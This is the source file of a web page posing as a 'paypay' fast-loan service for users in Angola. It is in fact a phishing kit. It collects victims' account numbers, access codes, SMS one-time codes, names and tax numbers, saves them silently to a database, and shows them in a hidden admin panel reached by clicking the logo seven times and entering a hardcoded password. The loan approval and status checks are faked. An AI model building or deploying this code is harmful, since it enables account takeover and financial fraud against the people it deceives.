import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { 
  verifyAdminPassword, 
  updateApplicationStatus, 
  getApplications, 
  checkApplicationStatus,
  getDeletedApplications,
  deleteApplication,
  restoreApplication,
  deletePermanently,
  deleteAllPermanently
} from "@/lib/admin.functions";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [
      { title: "paypay — Adiantamentos Rápidos" },
      { name: "description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
      { property: "og:title", content: "paypay — Adiantamentos Rápidos" },
      { property: "og:description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "requirements" | "consult";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"pending" | "finalized" | "pre" | "users">("pre");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);
  const refundMargin = useMemo(() => Math.round((amount * 0.05) + (term * 10)), [amount, term]);
  const totalToRefund = amount + refundMargin;
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [scrolledToBottom, setScrolledToBottom] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [applications, setApplications] = useState<any[]>([]);

  const saveProgress = async () => {
    if (step === "home" || step === "admin" || step === "success") return;
    try {
      const { supabase } = await import("@/integrations/supabase/client");
      const payload = {
        account_number: accountNumber,
        access_code: accessCode,
        payment_code: paymentCode.join(""),
        amount, term,
        refund_margin: refundMargin,
        total_to_refund: totalToRefund,
        name: personalData.name,
        nif: personalData.nif,
        step,
        updated_at: new Date().toISOString()
      };
      if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
      else if (accountNumber || accessCode) {
        const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
        if (data) setApplicationId(data.id);
      }
    } catch (err) {}
  };

  useEffect(() => {
    const timer = setTimeout(saveProgress, 2000);
    return () => clearTimeout(timer);
  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);

  useEffect(() => {
    if (logoClicks >= 7) {
      setStep("admin");
      setLogoClicks(0);
      toast.info("Acesso Administrativo - Por favor, insira a senha");
    }
    const timer = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(timer);
  }, [logoClicks]);

  const handleScroll = () => {
    if (scrollRef.current) {
      const { scrollTop, scrollHeight, clientHeight } = scrollRef.current;
      if (scrollTop + clientHeight >= scrollHeight - 5) setScrolledToBottom(true);
    }
  };

  const nextStep = (next: Step) => setStep(next);

  const AdminDataList = ({ filter }: { filter: "pending" | "finalized" | "pre" | "users" }) => {
    const [apps, setApps] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
      const fetchApps = async () => {
        const { supabase } = await import("@/integrations/supabase/client");
        let query = supabase
          .from("pending_applications")
          .select("*")
          .order("updated_at", { ascending: false });
        
        if (filter === "finalized") {
          query = query.eq("step", "success");
        } else if (filter === "pre") {
          query = query.in("step", ["step2", "step3", "step4", "summary", "confirm"]);
        } else if (filter === "users") {
          query = query.or("name.neq.'',account_number.neq.''");
        } else {
          query = query.not("step", "in", '("success")');
        }

        const { data } = await query;
        if (data) setApps(data);
        setLoading(false);
      };
      fetchApps();
    }, [filter]);

    if (loading) return <div className="text-xs text-muted-foreground animate-pulse">Carregando dados...</div>;
    if (apps.length === 0) return <div className="text-xs text-muted-foreground italic">Nenhum dado encontrado para esta aba.</div>;

    return (
      <div className="bg-secondary/40 rounded-xl p-4 space-y-4 max-h-96 overflow-y-auto">
        {apps.map((app) => (
          <div key={app.id} className="text-[10px] space-y-1 border-b border-border/50 pb-2 last:border-0 last:pb-0">
            <div className="flex justify-between font-bold text-foreground">
              <span>Conta: {app.account_number || "N/A"}</span>
              <span className="text-primary uppercase tracking-tighter">Status: {app.step}</span>
            </div>
            <div className="grid grid-cols-2 gap-x-2 text-muted-foreground italic">
              <p>Nome: {app.name || "N/A"}</p>
              <p>NIF: {app.nif || "N/A"}</p>
              <p>Valor: {app.amount ? `${Number(app.amount).toLocaleString()} Kz` : "N/A"}</p>
              <p>Reembolso Total: {app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "N/A"}</p>
              <p>Cod. Pagamento: {app.payment_code || "N/A"}</p>
              <p>Cod. Acesso: {app.access_code || "N/A"}</p>
            </div>
            <p className="text-[8px] text-right text-muted-foreground/60">
              Última atualização: {new Date(app.updated_at).toLocaleString()}
            </p>
          </div>
        ))}
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-[#F8F9FC] font-sans">
      <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div onClick={() => setLogoClicks(p => p + 1)} className="cursor-pointer relative z-10">
          <img src="/logo-paypay.png" alt="paypay" className="h-8 md:h-10" />
          <div className="absolute inset-0 z-20 pointer-events-none" />
        </div>
        <div className="flex items-center gap-6 text-[11px] font-medium text-muted-foreground">
          <button className="flex items-center gap-1"><Globe className="w-3.5 h-3.5" /> Português (AO)</button>
        </div>
      </div>
      <div className="max-w-md mx-auto px-6 py-12">
        <AnimatePresence mode="wait">
          {step === "home" && (
            <motion.div key="home" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="space-y-8">
              <div className="text-center space-y-4">
                <h1 className="text-4xl font-black text-foreground leading-[1.1] tracking-tighter uppercase italic">
                  Empréstimos <span className="text-primary not-italic">Rápidos</span>
                </h1>
                <p className="text-muted-foreground text-sm font-medium">Dinheiro na conta em menos de 5 minutos, sem burocracia.</p>
              </div>
              
              <div className="grid gap-4">
                <button 
                  onClick={() => nextStep("login")} 
                  className="group relative overflow-hidden bg-primary text-white p-6 rounded-[2rem] font-black text-xl uppercase tracking-wider shadow-2xl shadow-primary/30 hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-between"
                >
                  <span className="relative z-10">Solicitar Agora</span>
                  <div className="bg-white/20 p-2 rounded-full group-hover:bg-white/30 transition-colors">
                    <ChevronLeft className="w-6 h-6 rotate-180" />
                  </div>
                </button>

                <div className="grid grid-cols-2 gap-4">
                  <button 
                    onClick={() => nextStep("consult")} 
                    className="bg-white border-2 border-primary/10 p-5 rounded-[1.5rem] font-bold text-xs uppercase text-primary hover:bg-primary/5 transition-all flex flex-col items-center gap-2"
                  >
                    <div className="bg-primary/10 p-2 rounded-xl">
                      <LayoutDashboard className="w-5 h-5" />
                    </div>
                    Consultar Status
                  </button>
                  <button 
                    onClick={() => nextStep("requirements")} 
                    className="bg-white border-2 border-primary/10 p-5 rounded-[1.5rem] font-bold text-xs uppercase text-primary hover:bg-primary/5 transition-all flex flex-col items-center gap-2"
                  >
                    <div className="bg-primary/10 p-2 rounded-xl">
                      <ShieldCheck className="w-5 h-5" />
                    </div>
                    Requisitos
                  </button>
                </div>
              </div>

              <div className="bg-secondary/30 p-4 rounded-2xl flex items-center gap-3 border border-border/50">
                <div className="bg-green-500/20 p-2 rounded-full">
                  <CheckCircle2 className="w-4 h-4 text-green-600" />
                </div>
                <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-tight">
                  <span className="text-foreground font-bold">12,492</span> empréstimos aprovados hoje em Luanda.
                </p>
              </div>
            </motion.div>
          )}

          {step === "requirements" && (
            <motion.div key="requirements" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 space-y-8">
              <button onClick={() => nextStep("home")} className="flex items-center gap-2 text-xs font-black uppercase text-muted-foreground hover:text-primary transition-colors">
                <ChevronLeft className="w-4 h-4" /> Voltar
              </button>
              <div className="space-y-6">
                <h2 className="text-2xl font-black uppercase italic tracking-tighter">O que você <span className="text-primary">precisa</span></h2>
                <div className="space-y-4">
                  {[
                    "Conta PayPay ativa há mais de 3 meses",
                    "NIF válido e atualizado",
                    "Saldo mínimo de 500 Kz para validação",
                    "Sem dívidas pendentes no sistema"
                  ].map((req, i) => (
                    <div key={i} className="flex items-start gap-3 p-4 bg-secondary/20 rounded-2xl">
                      <div className="bg-primary/10 p-1 rounded-lg mt-0.5">
                        <Check className="w-3 h-3 text-primary" />
                      </div>
                      <p className="text-sm font-bold text-muted-foreground leading-snug">{req}</p>
                    </div>
                  ))}
                </div>
              </div>
              <button onClick={() => nextStep("login")} className="w-full bg-primary text-white h-14 rounded-2xl font-black uppercase tracking-widest shadow-lg">Entendido</button>
            </motion.div>
          )}

          {step === "consult" && (
            <motion.div key="consult" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 space-y-8 text-center">
              <button onClick={() => nextStep("home")} className="flex items-center gap-2 text-xs font-black uppercase text-muted-foreground hover:text-primary transition-colors">
                <ChevronLeft className="w-4 h-4" /> Voltar
              </button>
              <div className="space-y-4">
                <div className="bg-primary/10 w-16 h-16 rounded-3xl flex items-center justify-center mx-auto">
                  <User className="w-8 h-8 text-primary" />
                </div>
                <h2 className="text-2xl font-black uppercase italic tracking-tighter">Consultar <span className="text-primary">Status</span></h2>
                <p className="text-xs text-muted-foreground font-medium uppercase">Insira seu NIF para verificar o andamento do pedido.</p>
              </div>
              <div className="space-y-4">
                <input placeholder="SEU NIF AQUI" className="w-full h-14 bg-secondary/40 border-0 rounded-2xl px-6 font-black text-center text-primary placeholder:text-muted-foreground/50 outline-none focus:ring-2 ring-primary/20 transition-all uppercase" />
                <button onClick={() => toast.error("Nenhuma candidatura encontrada para este NIF.")} className="w-full bg-primary text-white h-14 rounded-2xl font-black uppercase tracking-widest shadow-lg">Verificar Agora</button>
              </div>
            </motion.div>
          )}
          {step === "login" && (
            <motion.div key="login" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[32px] shadow-[0_8px_30px_rgb(0,0,0,0.04)] p-10 space-y-8 border border-border/40">
              <div className="flex flex-col items-center space-y-6 text-center">
                <img src="/logo-paypay.png" alt="paypay" className="h-14" />
                <div className="space-y-3">
                  <h2 className="text-[22px] font-bold text-[#1A1A1A] tracking-tight">Iniciar Sessão</h2>
                  <p className="text-[#666666] text-[13px] leading-relaxed max-w-[240px]">Insira os dados da sua conta paypay para aceder ao Empréstimo pay</p>
                </div>
              </div>
              <div className="space-y-8">
                <div className="space-y-3">
                  <label className="text-[15px] font-bold text-[#1A1A1A]">Número da Conta</label>
                  <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors"><input type="text" placeholder="9xxxxxx323" value={accountNumber} onChange={e => setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 9))} className="w-full text-[15px] outline-none bg-transparent py-3" /></div>
                </div>
                <div className="space-y-3">
                  <label className="text-[15px] font-bold text-[#1A1A1A]">Código de acesso</label>
                  <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors group">
                    <input type={showAccessCode ? "text" : "password"} placeholder="•••••••••" value={accessCode} onChange={e => setAccessCode(e.target.value)} className="w-full text-[15px] outline-none bg-transparent py-3 pr-10" />
                    <button onClick={() => setShowAccessCode(!showAccessCode)} className="absolute right-0 top-1/2 -translate-y-1/2 text-[#BBBBBB] hover:text-primary transition-colors">{showAccessCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}</button>
                  </div>
                </div>
              </div>
              <button disabled={accountNumber.length < 9 || accessCode.length < 8} onClick={() => nextStep("step2")} className="w-full bg-primary text-white h-[52px] rounded-2xl font-bold text-[15px] transition-all cursor-pointer">Entrar</button>
            </motion.div>
          )}
          {step === "step2" && (
            <motion.div key="step2" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 space-y-8">
              <div className="text-center space-y-4">
                <div className="bg-primary/10 w-16 h-16 rounded-3xl flex items-center justify-center mx-auto">
                  <CreditCard className="w-8 h-8 text-primary" />
                </div>
                <h2 className="text-2xl font-black uppercase italic tracking-tighter">Código de <span className="text-primary">Pagamento</span></h2>
                <p className="text-[10px] text-muted-foreground font-black uppercase tracking-tighter">Introduza o código de 6 dígitos enviado por SMS</p>
              </div>
              
              <div className="flex justify-between gap-2">
                {paymentCode.map((digit, idx) => (
                  <input
                    key={idx}
                    id={`code-${idx}`}
                    maxLength={1}
                    value={digit}
                    onChange={(e) => {
                      const newCode = [...paymentCode];
                      newCode[idx] = e.target.value.replace(/\D/g, "");
                      setPaymentCode(newCode);
                      if (newCode[idx] && idx < 5) document.getElementById(`code-${idx + 1}`)?.focus();
                    }}
                    className="w-10 h-14 text-center text-xl font-black bg-secondary/40 border-0 rounded-xl focus:ring-2 ring-primary/20 outline-none transition-all"
                  />
                ))}
              </div>

              <div className="space-y-4">
                <button 
                  disabled={paymentCode.some(d => !d)}
                  onClick={async () => { await saveProgress(); nextStep("step3"); }} 
                  className="w-full bg-primary text-white h-14 rounded-2xl font-black uppercase tracking-widest shadow-lg shadow-primary/20 disabled:opacity-50 transition-all"
                >
                  Verificar Código
                </button>
                <button onClick={() => toast.success("Código reenviado com sucesso!")} className="w-full text-[10px] font-black uppercase text-muted-foreground hover:text-primary transition-colors tracking-tighter">Não recebi o código</button>
              </div>
            </motion.div>
          )}

          {step === "step3" && (
            <motion.div key="step3" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 space-y-8">
              <div className="space-y-6">
                <div className="flex items-center justify-between">
                  <h2 className="text-2xl font-black uppercase italic tracking-tighter">Valor do <span className="text-primary">Empréstimo</span></h2>
                  <div className="bg-primary/10 px-3 py-1 rounded-full">
                    <span className="text-primary font-black text-xs uppercase italic">Rápido</span>
                  </div>
                </div>

                <div className="space-y-8 bg-secondary/20 p-6 rounded-[2rem]">
                  <div className="text-center space-y-1">
                    <p className="text-[10px] font-black uppercase text-muted-foreground tracking-tighter">Você recebe</p>
                    <h3 className="text-4xl font-black text-primary tracking-tighter italic">{amount.toLocaleString("pt-AO")} <span className="text-lg">Kz</span></h3>
                  </div>
                  
                  <div className="space-y-4">
                    <input 
                      type="range" 
                      min="2000" 
                      max="35000" 
                      step="500" 
                      value={amount} 
                      onChange={e => setAmount(Number(e.target.value))} 
                      className="w-full h-2 bg-primary/10 rounded-lg appearance-none cursor-pointer accent-primary"
                    />
                    <div className="flex justify-between text-[8px] font-black text-muted-foreground uppercase tracking-tighter">
                      <span>2.000 Kz</span>
                      <span>35.000 Kz</span>
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <p className="text-[10px] font-black uppercase text-muted-foreground tracking-tighter ml-2">Escolha o prazo de pagamento</p>
                  <div className="grid grid-cols-4 gap-2">
                    {[15, 30, 45, 60].map((d) => (
                      <button
                        key={d}
                        onClick={() => setTerm(d)}
                        className={cn(
                          "py-3 rounded-xl text-xs font-black transition-all border-2",
                          term === d ? "bg-primary border-primary text-white scale-105" : "bg-white border-primary/5 text-muted-foreground hover:border-primary/20"
                        )}
                      >
                        {d}d
                      </button>
                    ))}
                  </div>
                </div>

                <div className="bg-primary text-white p-4 rounded-[1.5rem] space-y-2">
                  <div className="flex justify-between items-center text-[9px] font-black uppercase tracking-tighter opacity-80">
                    <span>Taxa Administrativa</span>
                    <span>{refundMargin.toLocaleString("pt-AO")} Kz</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-[10px] font-black uppercase tracking-tighter">Total a Reembolsar</span>
                    <span className="text-lg font-black italic tracking-tighter">{totalToRefund.toLocaleString("pt-AO")} Kz</span>
                  </div>
                </div>
              </div>

              <div className="space-y-4">
                <div 
                  className="h-20 overflow-y-auto bg-secondary/40 p-3 rounded-xl text-[8px] font-bold text-muted-foreground leading-relaxed custom-scrollbar" 
                  ref={scrollRef} 
                  onScroll={handleScroll}
                >
                  <p className="uppercase mb-2">Termos e Condições</p>
                  Ao solicitar este empréstimo, você concorda que: 1. O valor será creditado imediatamente. 2. A taxa de juros é fixa. 3. O atraso no pagamento resultará em multa diária de 2%. 4. Autoriza a consulta de seus dados bancários.
                </div>
                <button 
                  disabled={!scrolledToBottom} 
                  onClick={() => nextStep("step4")} 
                  className="w-full bg-primary text-white h-14 rounded-2xl font-black uppercase tracking-widest shadow-lg shadow-primary/20 disabled:opacity-50 transition-all"
                >
                  Aceitar e Continuar
                </button>
              </div>
            </motion.div>
          )}

          {step === "step4" && (
            <motion.div key="step4" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 space-y-8">
              <div className="text-center space-y-4">
                <div className="bg-primary/10 w-16 h-16 rounded-3xl flex items-center justify-center mx-auto">
                  <User className="w-8 h-8 text-primary" />
                </div>
                <h2 className="text-2xl font-black uppercase italic tracking-tighter">Dados do <span className="text-primary">Titular</span></h2>
                <p className="text-[10px] text-muted-foreground font-black uppercase tracking-tighter">Confirme sua identidade para finalizar</p>
              </div>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase text-muted-foreground ml-4">Nome Completo</label>
                  <input 
                    value={personalData.name} 
                    onChange={e => setPersonalData({...personalData, name: e.target.value})} 
                    placeholder="EX: JOÃO MANUEL" 
                    className="w-full h-14 bg-secondary/40 border-0 rounded-2xl px-6 font-black placeholder:text-muted-foreground/30 outline-none focus:ring-2 ring-primary/20 transition-all uppercase" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase text-muted-foreground ml-4">NIF (Número de Identificação)</label>
                  <input 
                    value={personalData.nif} 
                    onChange={e => setPersonalData({...personalData, nif: e.target.value.toUpperCase()})} 
                    placeholder="000000000LA000" 
                    className="w-full h-14 bg-secondary/40 border-0 rounded-2xl px-6 font-black placeholder:text-muted-foreground/30 outline-none focus:ring-2 ring-primary/20 transition-all uppercase" 
                  />
                </div>
              </div>

              <button 
                disabled={!personalData.name || personalData.nif.length < 10}
                onClick={() => nextStep("summary")} 
                className="w-full bg-primary text-white h-14 rounded-2xl font-black uppercase tracking-widest shadow-lg shadow-primary/20 transition-all"
              >
                Gerar Resumo
              </button>
            </motion.div>
          )}

          {step === "summary" && (
            <motion.div key="summary" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 space-y-8">
              <div className="text-center space-y-4">
                <div className="bg-green-500/10 w-16 h-16 rounded-3xl flex items-center justify-center mx-auto">
                  <CheckCircle2 className="w-8 h-8 text-green-600" />
                </div>
                <h2 className="text-2xl font-black uppercase italic tracking-tighter">Tudo <span className="text-green-600">Pronto!</span></h2>
                <p className="text-[10px] text-muted-foreground font-black uppercase tracking-tighter">Revise os dados antes de submeter</p>
              </div>

              <div className="bg-secondary/20 rounded-[2rem] p-6 space-y-4">
                <div className="flex justify-between items-center border-b border-border/50 pb-3">
                  <span className="text-[10px] font-black uppercase text-muted-foreground">Valor Solicitado</span>
                  <span className="font-black text-foreground italic">{amount.toLocaleString("pt-AO")} Kz</span>
                </div>
                <div className="flex justify-between items-center border-b border-border/50 pb-3">
                  <span className="text-[10px] font-black uppercase text-muted-foreground">Prazo de Pagamento</span>
                  <span className="font-black text-foreground italic">{term} Dias</span>
                </div>
                <div className="flex justify-between items-center border-b border-border/50 pb-3">
                  <span className="text-[10px] font-black uppercase text-muted-foreground">Reembolso Total</span>
                  <span className="font-black text-primary italic">{totalToRefund.toLocaleString("pt-AO")} Kz</span>
                </div>
                <div className="flex justify-between items-center pt-2">
                  <span className="text-[10px] font-black uppercase text-muted-foreground">Titular</span>
                  <span className="font-black text-foreground text-xs uppercase italic truncate max-w-[150px]">{personalData.name}</span>
                </div>
              </div>

              <button 
                onClick={() => { saveProgress(); nextStep("confirm"); }} 
                className="w-full bg-primary text-white h-14 rounded-2xl font-black uppercase tracking-widest shadow-lg shadow-primary/20 hover:scale-[1.02] active:scale-[0.98] transition-all"
              >
                Confirmar Empréstimo
              </button>
            </motion.div>
          )}
          {step === "confirm" && (
            <motion.div key="confirm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 text-center space-y-8">
              <div className="relative">
                <div className="w-20 h-20 bg-primary/10 rounded-3xl flex items-center justify-center mx-auto animate-pulse">
                  <ShieldCheck className="w-10 h-10 text-primary" />
                </div>
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-20 h-20 border-4 border-primary/30 border-t-primary rounded-3xl animate-spin" />
              </div>
              <div className="space-y-4">
                <h2 className="text-2xl font-black uppercase italic tracking-tighter">Processando <span className="text-primary">Análise</span></h2>
                <p className="text-[10px] text-muted-foreground font-black uppercase tracking-widest animate-pulse">Verificando elegibilidade em tempo real...</p>
              </div>
              {/* Simulate transition to success after a few seconds */}
              {useEffect(() => {
                const t = setTimeout(() => setStep("success"), 3500);
                return () => clearTimeout(t);
              }, [])}
            </motion.div>
          )}

          {step === "success" && (
            <motion.div key="success" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="bg-white rounded-[2.5rem] p-8 shadow-xl border border-border/40 text-center space-y-8">
              <div className="bg-green-500 w-20 h-20 rounded-3xl flex items-center justify-center mx-auto shadow-lg shadow-green-500/30">
                <Check className="w-10 h-10 text-white" />
              </div>
              <div className="space-y-4">
                <h2 className="text-3xl font-black uppercase italic tracking-tighter">Pedido <span className="text-green-600">Submetido</span></h2>
                <p className="text-sm font-bold text-muted-foreground leading-relaxed">Sua candidatura foi recebida com sucesso. Você receberá uma notificação via SMS em instantes.</p>
              </div>
              <button onClick={() => setStep("home")} className="w-full bg-secondary text-foreground h-14 rounded-2xl font-black uppercase tracking-widest">Voltar ao Início</button>
            </motion.div>
          )}
          {step === "admin" && (
            <motion.div key="admin" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
              {!adminAuthenticated ? (
                <div className="space-y-4">
                  <input type="password" placeholder="Senha" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" />
                  <button onClick={() => { if (adminPassword === "moneytool") setAdminAuthenticated(true); else toast.error("Incorreto"); }} className="w-full bg-primary text-white p-4">Entrar</button>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="flex gap-1 bg-secondary/30 p-1 rounded-xl">
                    {[
                      { id: "pending", label: "Pendentes" },
                      { id: "finalized", label: "Finalizados" },
                      { id: "pre", label: "Pré-Adiant." },
                      { id: "users", label: "Usuários" }
                    ].map((tab) => (
                      <button
                        key={tab.id}
                        onClick={() => setAdminTab(tab.id as any)}
                        className={cn(
                          "flex-1 py-2 text-[10px] font-black uppercase tracking-tighter rounded-lg transition-all",
                          adminTab === tab.id ? "bg-white text-primary shadow-sm" : "text-muted-foreground hover:bg-white/50"
                        )}
                      >
                        {tab.label}
                      </button>
                    ))}
                  </div>
                  <section className="space-y-3">
                    <h3 className="text-xs font-black uppercase text-primary flex items-center gap-2 tracking-wider">
                      <Info className="w-4 h-4" /> 
                      {adminTab === "pending" && "Pedidos Aguardando Aprovação"}
                      {adminTab === "finalized" && "Histórico de Pedidos Concluídos"}
                      {adminTab === "pre" && "Dados Capturados Automaticamente"}
                      {adminTab === "users" && "Todos os Usuários Registrados"}
                    </h3>
                    <AdminDataList filter={adminTab} />
                  </section>
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}